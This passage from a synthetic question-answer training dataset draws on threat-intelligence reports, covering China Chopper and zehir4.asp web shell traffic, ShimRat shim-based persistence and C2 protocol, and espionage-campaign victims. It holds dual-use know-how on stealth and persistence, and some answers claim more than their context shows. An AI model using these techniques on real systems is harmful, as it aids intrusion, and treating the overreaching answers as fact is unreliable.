Capabilities\nThe capabilities of both the payload and the client are impressive considering their size. The Web shell client contains a \"Security Scan\" feature, independent of the payload, that gives the attacker the ability to spider and use brute-force password guessing against authentication portals.\nIn addition to vulnerability hunting, China Chopper has excellent CnC features when combining the client and payload, include the following:\n\u2022 File Management (File explorer)\n\u2022 Database Management (DB client)\n\u2022 Virtual Terminal (Command shell)\nIn China Chopper's main window, right-clicking one of the target URLs brings up a list of possible actions (see Figure 7).\nMedium Headline: File Management\nUsed as a RAT, China Chopper makes file management simple. Abilities include uploading and downloading files to and from the target, using the file-retrieval tool Wget4 to download files from the Web to the target. Attackers can also edit, delete, copy, and rename files\u2014and even change their time stamp.\nThe Modify the file time option is a surprisingly effective stealth technique. Figure 9 shows the time stamps of the three files in the test directory before the Web shell modifies the time stamps. By default, Windows Explorer shows only the \"Date Modified\" field. Without the time stamp change, the Web shell easily stands out because it is newer than the other two files.\n4 Wget is available at http://www.gnu.org/software/wget/.\nFigure 10 shows the date of the file after the Web shell modifies the time stamp. The \"Date Modified\" value on the Web shell shows up as the same as the other two files. This is the default field displayed to users, so to the untrained eye it easily blends in\u2014especially with many files in the directory.\nClever investigators may think that they can spot the suspicious file due to the creation date being changed to the same date as the modified date. But this is not necessarily anomalous. Additionally, even if the file is detected, the forensic timeline is skewed because the date that the attacker planted the file is no longer present. Finding the real date that the file was planted requires examining the Master File Table (MFT). After acquiring the MFT using FTK, EnCase, or other means, FireEye recommends using mftdump.5 Written by FireEye researcher Mike Spohn, mftdump is a great tool for extracting and analyzing file metadata.\nTable 3 shows the time stamps pulled from the MFT for our Web shell file before and after the time stamps were modified. The \"fn*\" fields retain their original times, so some useful information remains.\n5 The mftdump tool is available at http://malware-hunters.net/all-downloads/.\nMedium Headline: Size\nMalicious and benign software usually suffers from the same principle: more features equals more code, which equals larger size. Considering how many features China Chopper offers, it is incredibly small\u2014just 73 bytes for the ASPX version, or 4 kilobytes on disk (see Figure 14). Compare that to other Web shells such as Laudanum (619 bytes) or RedTeam Pentesting (8,527 bytes). China Chopper is so small and simple that an attacker could conceivably type the contents of the shell by hand.\nBig Headline: Platform\nChina Chopper can run on any Web server capable of running JSP, ASP, ASPX, PHP, or CFM\u2014the majority of Web application languages. China Chopper can also run transparently on both Windows and Linux. This OS and application flexibility make China Chopper an even more dangerous Web shell.\n\"Server-side Payload Component\" on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX. Figure 19 shows it running on Linux with PHP. Here, the contents of the PHP version are just as minimalistic.\nWhile the available options differ depending on what platform China Chopper is running on, the file management features in Linux (see Figure 20) are similar to those in Windows.\nThe database client example shown in Figure 21 is MySQL instead of MS-SQL, but it offers many of the same capabilities.\nThe virtual terminal looks familiar (Figure 22), but uses Linux commands instead of Windows because they are ultimately interpreted by the underlying operating system.\nBig Headline: Delivery Mechanism\nChina Chopper's delivery mechanism is flexible due to the size, format, and simplicity of the malware's payload. This small, text-based payload can be delivered using any of the following mechanisms:\n\u2022 WebDAV file upload\n\u2022 JBoss jmx-console or Apache Tomcat management pages (For more details on this attack vector, read FireEye consultant Tony Lee's explanation)6\n\u2022 Remote exploit with a file drop\n\u2022 Lateral propagation from other access\n\nQuestion: What are the key features of the China Chopper payload, and how can its size and flexibility impact its effectiveness as a Web shell?\n\nAnswer:",
    "output": "The China Chopper payload is available in various languages such as ASP, ASPX, PHP, JSP, and CFM, making it highly flexible. Despite its small size, it offers extensive capabilities including file management, database management, and a virtual terminal. The payload is incredibly small\u2014just 73 bytes for the ASPX version, or 4 kilobytes on disk\u2014making it easy to conceal and even type by hand. Its ability to run on any Web server capable of running these languages and its compatibility with both Windows and Linux make it a versatile and dangerous Web shell.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 7.1.1 Installation & Persistence\nOne of the first things ShimRat does while active is making sure it becomes persistent on the system. Before actually activating any methods of persistence it will try to elevate privileges if needed it is not running with administrative privileges.\nShimRat elevates its privileges by performing a dll hijacking attack on vulnerable Windows components. Specifically, it abuses the migwiz.exe program by hijacking cryptbase.dll. ShimRat will try to gain higher privileges, but will continue to execute whether the elevation was successful or not. This elevation would make sure no uac popups would be shown to the victim. Would the user get uac popups they would appear to be coming from the antivirus product ShimRat hijacked, as mentioned before.\nShimRat has three methods of becoming persistent on a system:\n1 Installing a registry startup key\n2 Installing a service\n3 Install a shim\n12 https://msdn.microsoft. com/en-us/library/ windows/desktop/ ms685141(v=vs.85).aspx\n13 https://technet.microsoft. com/en-us/en-en/library/ dd837644%28v=ws.10%29. aspx\nInternally ShimRat uses an installation configuration which is set by the builder. The persistence configuration structure looks as follows (see Table 3):\nConfiguration items\nService name\nService description\nService title\nInstallation folder\nInstallation filename\nInjection target process\nTable 3: Persistence configuration structure.\nThe installation mode in the configuration structure, is a switch to decide which persistence method to use. If the switch is set to 1 it will become persistent by installing a service.  If it is set to 2 it will install a shim to become persistent. As a fall back method, if either installing a service or installing a shim would fail, it will use a registry startup key for persistence.\nSmall Headline: 7.1.3 Persistence through a service\nShimRat will create a new service under Windows using the information from the installation configuration shown in paragraph 7.1.1 above. This operation is performed through the Windows api functions available for registering, updating and starting of services12 .\nIt will start by stopping and removing any old service (if any exist). ShimRat will register a new service using the information from the persistence configuration and start it, after checking and removing any old services.\nSmall Headline: 7.1.4 Persistence through shims13\nOver the years Microsoft has gone to extraordinary lengths to ensure backward compatibility on its Windows platform. One of the outcomes of this process was the creation of the Application Compatibility Framework (acf) which helps ensure this compatibility. Through this framework, special fixes known as Microsoft Fix It's or just fixes can be run which can help mitigate security or compatibility problems.\nThe way the acf works is that when a process is started, it will determine if the newly created process needs to be shimmed. If this is the case, a special flag is raised to indicate this. Based on this flag the operating system will load the installed Shims and apply the required fixes. This means shims are simply hot patching processes on the fly. Most predefined fixes released by Microsoft are stored in:\n%WINDIR%\\AppPatch\\sysmain.sdb\nAny fix not defined in this sdb file, is called a 'Custom Fix' and can be installed by anyone with knowledge of the workings of this system.\nShimRat uses a shim to perform an application fix using an InjectDLL fix. An InjectDLL fix will inject a specified dll into a target process, this allows the code from the dll to run in the context of the target process. ShimRat has implemented this shim for both 32 and 64 bit platforms. In technical terms, the fix remains the same InjectDLL fix, but the dll ShimRat injects is different.\nNormally when an official Fix It shim is installed it would be an official update or patch of some kind and this would be registered as being installed as an update. This means the shim is visible in the software manager in Windows under the Windows component section. ShimRat shims do not appear in the software manager due to the way it installs the shims. Normally when a shim is installed, it is performed via the official installer which will register the Shim and place it in the correct location. ShimRat performs the registration of the shim manually, bypassing the official installation and in turn making sure that it won't show up under the installed software in Windows.\nThe shim databases are installed in either of two locations:\n%WINDIR%\\AppPatch\\Custom\\ (32 bit)\n%WINDIR%\\AppPatch\\AppPatch64\\Custom\\ (64 bit)\nAfter placing the files on disk, ShimRat manually loads the shims into the shim database by first registering it in the registry at two specific locations as shown in Figure 13.\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\nAfter filling the registry keys, ShimRat calls SdbRegisterDatabaseEx to register the database and finally ShimFlushCache to flush the cache and enable the shim. From this point on, every newly started instance of svchost.exe will be shimmed and ShimRat will be. It locks itself with the use of mutexes, to ensure there aren't multiple copies of ShimRat running. ShimRat mutexes are a combination of the string Global\\\\qwe followed by one or more numbers.\nSmall Headline: 7.1.6 Command and control communication\nShimRat communicates over HTTP to its C2 server. While versions since 2015 have seen the introduction of HTTPS usage, ShimRat does not appear to verify the SSL certificate of C2 servers, which are generally self-signed certificates. ShimRat does have the ability to use pre-configured HTTP proxies, which is useful in situations where a victim has forced local proxies in the network with authentication.\nLike with persistence, ShimRat holds a C2 communication configuration internally.\nThe structure of the configuration looks as follows (see Table 4):\nConfiguration items\nPrimary C2 location\nSecondary C2 location\nCampaign ID\nC2 server password\nProxy\nProxy username\nProxy password\nTable 4: C2 communication configuration.\nShimRat communicates with its C2 server through a pull and push mechanism. ShimRat constantly asks its C2 server for commands and once it has executed a command, it will send back the result. The structure of the commands exchanged with the C2 server is quite simple:\n\u2022 Every command is encapsulated within two tags, currently these tags are the word 'Data' which is added in front of and at the end of the command string. In the past this used to be the string 'Yuok' as described in paragraph 2.1.\n\u2022 Every command has a unique 'ID'. These IDs are notated as $$<ID number>\n\u2022 The final structure of the commands send to and from the C2 server is: <data tag><command ID><command data><data tag>\nFor example, when ShimRat first connects to a C2 server it registers itself. This initial registration looks like this:\nData$$00#DEMO-PC-0800232979FD-SYSTEM.test.0.0.01.1#WinXP Professional SP3 (2600) (x86)Data\nThe aforementioned example shows the two Data tags at the start and at the end. The command id is 00, the registration command, followed by the associated data. In this case, the data comprises basic information including the machine name, DEMO-PC, system information, 0800232979FD-SYSTEM, the C2 password, test, its version and the operating system version and whether it is a 32 or 64bit operating system in the last part.\nShimRat will continue sending the initial check-in data until the C2 server responds with Data. Once it has received this response, which indicates it registered successfully, it will start polling for new commands to execute.\nIt polls the C2 for commands by sending command id 02 in combination with its system information:\nSmall Headline: Data$$02#DEMO-PC-0800232979FD-SYSTEMData\nThe C2 server will respond with one of 3 possible tags:\n\u2022 Atad: returned when there is nothing to do for the malware. ShimRat will sleep for a specified time period before polling again.\n\u2022 Aatd: returned when the C2 does not recognize the system information. It forces ShimRat to register itself again. After registering itself again ShimRat will continue polling the C2 server for commands.\n\u2022 Data: returned when a command is available. The whole response string would actually be Data$$<command ID> where ShimRat would parse the command id, execute the desired command and send the result back to the C2. Details of which command ID maps to which command can be found in Table 5.\nTable 5 lists the possible command ids that a C2 server could send (the Initiating command id) and the corresponding responses by ShimRat (the Responding command id). Some commands will result in one or more different responding ids based on the data ShimRat has to send back.\nPlease note, that there are checks when executing these commands where the keywords Atad Aatd and Data are used to evaluate the outcome of the command. These states are not described or shown in the table, nor does the table include command ids 00 and 01 which are used for initial registration and command polling respectively.\nSmall Headline: 7.2.1 Summary\nShimRatReporter is a tool first seen in late 2014. The goal of this tool is to gather important information about the target infrastructure. More details about this are available in paragraph 7.2.2.\nAdditionally the tool can be configured to download a 2nd stage payload from 1 or 2 preconfigured locations. The idea behind ShimRatReporter is to be able to deliver customized ShimRat builds. This can be seen in the preconfigured proxy configuration in some of the attacks. In these attacks, the ShimRat builds that were sent to the target machines were already configured with the credentials for the local proxy in the target network.\nQuestion: Describe the structure and process of ShimRat's command and control (C2) communication. How does it handle encryption and proxies?",
    "output": "Answer: ShimRat communicates over HTTP to its C2 server, with recent versions supporting HTTPS but not verifying SSL certificates. It uses a pull and push mechanism to constantly ask for commands and send back results. The commands are encapsulated within 'Data' tags and have a unique ID. ShimRat sends an initial registration command with system information and then polls for new commands. The C2 server responds with tags indicating whether there are commands to execute or if ShimRat should sleep. ShimRat can use pre-configured HTTP proxies, useful in networks with forced local proxies requiring authentication.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 4.3.2 Affected Institutions\nDuring our investigations we found that a variety of personal information belonging to individuals had been compromised. This included various lists of contacts along with their personal details that could be used by the attackers. It also included information about travel, including air and rail tickets, receipts, invoices and other billing information. In addition we found personal banking information, scans of identification documents, job (and other) applications, legal documents and information about ongoing court cases. The attackers also exfiltrated personal email communications. All of this information can be leveraged for future attacks, especially attacks against those within the compromised individual's social network.\n\u2462\nNational Security Council Secretariat, India\nThe National Security Council Secretariat (NSCS) of India is comprised of the Joint Intelligence Committee and is a component of the National Security Council established in 1998 along with a Strategic Policy Group and an Advisory Board. The National Security Council is headed by the Prime Minister of India and is responsible for strategic planning in the area of national security (Subrahmanyam 2010; Indian Embassy 1998). We assess that a computer at the NSCS was compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, fourteen documents, including two documents marked \"SECRET,\" were exfiltrated. In addition to documents containing the personal and financial\ninformation of what appears to be the compromised individual, the exfiltrated documents focus on India's security situation in the states of Assam, Manipur, Nagaland and Tripura as well as the Naxalites, Maoists, and what is referred to as \"left wing extremism.\"\n\u2462\nDiplomatic Missions, India\nIndia maintains numerous diplomatic missions abroad that provide consular services relating to passports and visas as well as faciltaing trade, commerce and engaging in diplomatic relations (Indian government 2010). We assess that computers at the Embassy of India, Kabul, the Embassy of India, Moscow, the Consulate General of India, Dubai, and the High Commission of India in Abuja, Nigeria were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 99 documents, including what appears to be one encrypted diplomatic correspondence as well as five documents marked \"RESTRICTED\" and four documents marked \"CONFIDENTIAL,\" were exfiltrated. In addition to documents containing personal, financial, and travel information on embassy and diplomatic staff, the exfiltrated documents included numerous visa applications, passport office circulars, and country assessments and reports. Confidential visa applications from citizens of Afghanistan, Australia, Canada, the PRC, Croatia, Denmark, Germany, India, Ireland, Italy, New Zealand, Philippines, Senegal, Switzerland, Uganda, and the United Kingdom were among the exfiltrated documents.\n\u2462\nMilitary Engineer Services, India\nThe Military Engineer Services (MES) is a government construction agency that provides services to the Indian Army, Navy and Air Force. In addition, the MES services the government sector and civil works projects. We assess that computers at the MES-Bengdubi, MES-Kolkata, MES(AF)-Bangalore, and MES-Jalandhar were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 78 documents were exfiltrated. While these documents included manuals and forms that would not be considered sensitive, they also included documents that contained private information on personnel, and documents and presentations concerning the financing and scheduling of specific engineering projects.\n\u2462\nMilitary Personnel, India\nWe assess that computers linked with the 21 Mountain Artillery Brigade in the state of Assam, the Air Force Station, Race Course, New Delhi and the Air Force Station, Darjipura Vadodara, Gujarat were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, sixteen documents were exfiltrated. One document contained personal information on Saikorian alumni of the Sainik School, Korukonda, which prepares students for entry into the National Defence Academy. One document is a detailed briefing on a live fire exercise while others pertain to surface-to-air missile systems and moving target indicators.\n\u2462\nMilitary Educational Institutions, India\nWe assess that computers at the Army Institute of Technology in Pune, Maharashtra and the Military College of Electronics and Mechanical Engineering in Secunderabad, Andhra Pradesh were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, twenty-one documents, including one marked \"RESTRICTED\", were exfiltrated. There are documents and presentations detailing the finances of one of the institutions as well as personal and private information on students and their travel. There is also a document that describes \"Project Shakti,\" the Indian Army's command and control system for artillery (India Defence 2007).\n\u2462\nInstitute for Defence Studies and Analyses, India\nWe assess that computers at the Institute for Defence Studies and Analyses (IDSA) were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 187 documents were exfiltrated. While many of the documents were published papers from a variety of academic sources, there were internal documents, such as an overview of the IDSA research agenda, minutes of\nmeetings for the Journal of Defence Studies, budgets and information on a variety of speakers, visitors, and conference participants.\n\u2462\nDefence-oriented publications, India\nWe assess that computers at the India Strategic defence magazine and FORCE magazine were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 58 documents were exfiltrated. While these documents include publicly accessible articles and previous drafts of those articles, there is also private information regarding the contact details of subscribers and conference participants. The documents also include interviews, documents, and PowerPoint presentations from conferences that detail national security topics, such as network data and monitoring for national security, and responses to combat cyber threats.\n\u2462\nCorporations, India\nWe assess that computers at YKK India Private Limited, DLF Limited, and TATA were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, five documents were exfiltrated. These documents include rules overseeing busiiness travel, a presentation on roadmap and financial status, and an annual plan for a business partnership.\n\u2462\nMaritime, India\nWe assess that computers at the National Maritime Foundation and the Gujarat Chemical Port Terminal Company Limited were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 53 documents were exfiltrated. These documents include a summary of a seminar as well as numerous documents relating to specific shipping schedules, financial matters and personal medical information.\n\u2462\nUnited Nations\nThe United Nations Economic and Social Commission for Asia and the Pacific (UNESCAP) is based in Thailand and facilitates development in the Asia-Pacific region. We assess that a computer at UNESCAP has been compromised based on the documents exfiltrated by the attackers. In addition to information concerning a variety of conferences and presentations, there were also internal Mission Report documents regarding travel and events in the region.\nPART 5:\n\nWhat types of documents were exfiltrated from the compromised diplomatic missions in India, and what sensitive information did these documents contain?",
    "output": "During the Shadowserver attacks, 99 documents were exfiltrated from the compromised diplomatic missions in India. These included one encrypted diplomatic correspondence, five documents marked 'RESTRICTED,' and four documents marked 'CONFIDENTIAL.' The exfiltrated documents contained personal, financial, and travel information on embassy and diplomatic staff, numerous visa applications, passport office circulars, and country assessments and reports. Confidential visa applications from citizens of various countries, including Afghanistan, Australia, Canada, the PRC, Croatia, Denmark, Germany, India, Ireland, Italy, New Zealand, Philippines, Senegal, Switzerland, Uganda, and the United Kingdom, were among the exfiltrated documents.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: ASP Shell Backdoor: ZEHIR4.ASP\n- Backdoor script first accessed\nGET /zehir4.asp HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;\n.NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 04:56:13 GMT\nX-Powered-By: ASP.NET\nContent-Length: 11480\nContent-Type: text/html\nSet-Cookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF; path=/\nCache-control: private\nzehir3 --> powered by zehir <zehirhacker@hotmail.com\n<title>&gt;</title>\n<center>\n<a href=\"zehir4.asp?mevla=1&status=13\" onclick=\"sistemBilgisi(this.href);return false;\">System Info</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=40\" onclick=\"sistemTest(this.href);return false;\">System Test</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=50&path=c:\\inetpub\\wwwroot\\\" onclick=\"SitelerTestte(this.href);return false;\">Sites Test</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=14&path=c:\\inetpub\\wwwroot\\\"\nklasorIslemleri\nFolder Action\nonclick=\"(this.href);return false;\"></a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=15\" onclick=\"sqlServer(this.href);return false;\">SQL Server</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=33\" onclick=\"poweredby(this.href);return\nfalse;\">POWERED BY</a>\n<script language=javascript>\nfunction sistemBilgisi(yol){ NewWindow(yol,\"\",600,240,\"no\");\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n- System Info\nGET /zehir4.asp?mevla=1&status=13 HTTP/1.1\nAccept: */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 05:07:29 GMT\nX-Powered-By: ASP.NET\nContent-Length: 1663\nContent-Type: text/html\nCache-control: private\n<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title><table width=100% cellpadding=0 cellspacing=0><tr><td colspan=2 align=center><font color=yellow face='courier new'><b><font style='FONT-WEIGHT:normal' color=red face=wingdings>:</font> Sistem Bilgileri <font color=red face=wingdings style='FONT-\nWEIGHT:normal'>:</font></td></tr><tr><td><b><font color=red>Local Adres</td><td> 192.168.1.100</td></tr><tr><td><b><font color=red>User Agent</td><td> Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)</td></tr><tr><td><b><font color=red>Server</td><td>\n192.168.1.1</td></tr><tr><td><b><font color=red>IP</td><td>\n192.168.1.1</td></tr><tr><td><b><font color=red>HTTPD</td><td> MicrosoftIIS/5.1</td></tr><tr><td><b><font color=red>Port</td><td> 80</td></tr><tr><td><b><font color=red>Yol</td><td> c:\\inetpub\\wwwroot\\</td></tr><tr><td><b><font color=red>Log Root</td><td> /LM/W3SVC/1/ROOT</td></tr><tr><td><b><font color=red>HTTPS</td><td> off</td></tr></table>\n<script language=javascript> function NewWindow(mypage, myname, w, h, scroll) { var winl = (screen.width - w) / 2; var wint = (screen.height - h) / 2; winprops =\n'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable' win = window.open(mypage, myname, winprops)\nif (parseInt(navigator.appVersion) >= 4) { win.window.focus(); } } function ffd(yol){\nNewWindow(yol,\"\",420,100,\"no\");\n}\n</script>\n<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse> </tr></table>\n- System Test\nGET /zehir4.asp?mevla=1&status=40\nHTTP/1.1\nAccept: */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET\nCLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF\n---- RESPONSE ----\nSmall Headline: HTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 05:11:56 GMT\nX-Powered-By: ASP.NET\nContent-Length: 1284\nContent-Type: text/html\nCache-control: private\n<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title><table width='100%' align=center cellpadding=0 cellspacing=0 border=1><tr bgcolor=#ffffc0><td width='30%' align=center><font color=navy><b>Konum</td><td width='70%' align=center><font color=navy><b>Sonu.</td></tr><tr><td><b>C:\\</td><td><font color=red>yazma yetkisi yok! : [Object required]</td></tr><tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : [Object required]</td></tr><tr><td><b>Local Path <br>Parent Folder</td><td><font color=yellow>Folder : 5<br>File : 0</td></tr><tr><td><b>Local Path <br>P.Parent Folder</td><td><font color=yellow>Folder : 11<br>File : 10</td></tr></table> <script language=javascript> function NewWindow(mypage, myname, w, h, scroll) { var winl = (screen.width - w) / 2; var wint = (screen.height - h) / 2; winprops =\n'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable' win = window.open(mypage, myname, winprops) if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }\n} function ffd(yol){\nNewWindow(yol,\"\",420,100,\"no\");\n} </script>\n<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse> </tr></table>\n- SQL Server\nGET /zehir4.asp?mevla=1&status=15\nHTTP/1.1\nAccept: */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 05:18:07 GMT\nX-Powered-By: ASP.NET\nContent-Length: 1169\nContent-Type: text/html\nCache-control: private\n<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title><form method=get action='' target='_opener' id=form1 name=form1><table cellpadding=0 cellspacing=0 align=center><tr><td align=center><font size=2>SQL Server i.in connection string giriniz</td></tr><tr><td align=center><input type=hidden value='7' name=status><input type=hidden value='12:18:07 AM' name=Time><input style='width:250; height:21' value='' name=path><br><input type=submit value='SQL Servera Ba.lan' style='height:23;width:170' id=submit1 name=submit1></td></tr></table></form>\n<script language=javascript> function NewWindow(mypage, myname, w, h, scroll) { var winl = (screen.width - w) / 2; var wint = (screen.height - h) / 2; winprops =\n'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable' win = window.open(mypage, myname, winprops) if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }\n} function ffd(yol){\nNewWindow(yol,\"\",420,100,\"no\");\n}\n</script>\n<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse> </tr></table>\nNetwork traffic observed when the following fake connection string is written in the box and the button is pressed: \"Server=myServerName\\myInstanceName;Database=myDataBase;User\nId=myUsername;\nPassword=myPassword;\"\n\nHow does the 'zehir4.asp' ASP Shell backdoor facilitate file and folder manipulation, and what specific actions can an attacker perform using these capabilities?",
    "output": "A: The 'zehir4.asp' ASP Shell backdoor facilitates file and folder manipulation through various options available in the backdoor interface. For example, the 'Folder Action' option allows the attacker to perform actions such as deleting, copying, and moving folders. Additionally, the attacker can browse directories, upload, download, copy, delete, modify, and search for files. These capabilities are accessed through different links in the backdoor interface, each corresponding to specific actions. This level of control enables the attacker to manipulate the file system of the compromised server extensively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How might an adversary like OceanLotus use social media to enhance their attack methods, as seen in the recent APT report involving the Glitch platform?",
    "output": "Search Open Websites/Domains: Social Media is a technique used by adversaries to gather information about victims from social media sites. This can include business announcements, staff roles, locations, and interests. In the case of the OceanLotus group, they may use social media to gather information about potential victims, such as employees who may be more likely to open malicious attachments or click on suspicious links. They could also use social media to spread misinformation or create fake profiles to elicit specific information from victims. Furthermore, they may use social media to establish operational resources, such as creating fake accounts or compromising existing ones, to facilitate their attacks. As seen in the recent APT report, the attackers used a misinformation document with the same content in both campaigns, which could have been spread through social media channels. Additionally, the attackers used the Glitch platform to host their C2 service, which could have been discovered through social media searches. Therefore, it is essential for organizations to be aware of the risks associated with social media and to educate their employees on how to identify and avoid potential threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Fidelis Take\nFidelis XPS sensors detect the \"njRAT\" malware variants and domains observed throughout this report.\nFidelis XPS sensors detected the NJC242.exe/njRAT malware as \"Trojan.Win32.Jorik.Agent.rkp\". Fidelis XPS is capable of detecting this threat regardless of delivery method employed by the Threat Actors responsible. Fidelis XPS can detect and alert on executables such as the \"njRAT\" malware multiple layers deep inside of archive files (i.e. ZIP), or even XOR'ed inside of a weaponized MS Office document or Adobe PDF File. The Fidelis Threat Research and Network Forensics and Incident Response teams will continue to actively monitor the ever-evolving threat landscape for the latest threats to our customers' network security.\n\nQ: How does the Fidelis XPS sensor technology contribute to the detection of 'njRAT' malware variants, and what specific capabilities does it offer to enhance network security against such threats?",
    "output": "A: Fidelis XPS sensors are designed to detect 'njRAT' malware variants and associated domains, providing a robust defense mechanism against these threats. Specifically, Fidelis XPS identified the NJC242.exe/njRAT malware as 'Trojan.Win32.Jorik.Agent.rkp'. One of the key strengths of Fidelis XPS is its ability to detect threats irrespective of the delivery method used by the threat actors. This includes detecting executables like 'njRAT' malware even when they are nested multiple layers deep within archive files such as ZIP files, or when they are obfuscated using techniques like XOR encryption within weaponized MS Office documents or Adobe PDF files. This multi-layered detection capability significantly enhances network security by ensuring that threats are identified and alerted upon, even if they are hidden or disguised.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Iranian government's use of contractors and security forums relate to the technique of External Defacement, and what role does ideology play in the selection of contractors for such operations?",
    "output": "External Defacement is a technique used by adversaries to deliver messaging, intimidate, or mislead an organization or users by defacing systems external to the organization. In the context of the Iranian government's cyber operations, contractors play a crucial role in executing such campaigns. According to the APT report, Iranian contractors, such as Nasr Institute and ITSEC, have been linked to various operations, including defacement campaigns. These contractors often recruit hackers from online forums, such as Ashiyane and Simorgh, which serve as trust communities for the Iranian government. However, the selection of contractors is not solely based on their technical skills, but also on their ideological alignment with the regime. The Iranian government prioritizes ideology over skills, as evident in the case of Mohammad Hussein Tajik, who was rejected due to concerns about his ideological commitment. This emphasis on ideology ensures that contractors are loyal to the regime and less likely to defect or betray the government's trust. In the context of External Defacement, this means that contractors are more likely to carry out defacement operations that align with the government's ideological goals, such as spreading propaganda or intimidating opponents.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do the characteristics of cyber attacks from the Asia-Pacific region differ from those originating in Russia/Eastern Europe, and what strategies can security professionals employ to defend against these distinct types of threats?",
    "output": "Cyber attacks from the Asia-Pacific region, such as those conducted by large, bureaucratic hacker groups like the 'Comment Crew,' are characterized by high-frequency, brute-force methods pursuing multiple goals and targets. In contrast, cyber attacks from Russia/Eastern Europe are more technically advanced and highly effective at evading detection. Security professionals can tailor their defenses by implementing robust intrusion detection systems to counter brute-force attacks from the Asia-Pacific region and investing in advanced threat detection and response mechanisms to combat the sophisticated, stealthy tactics employed by Russian/Eastern European hackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
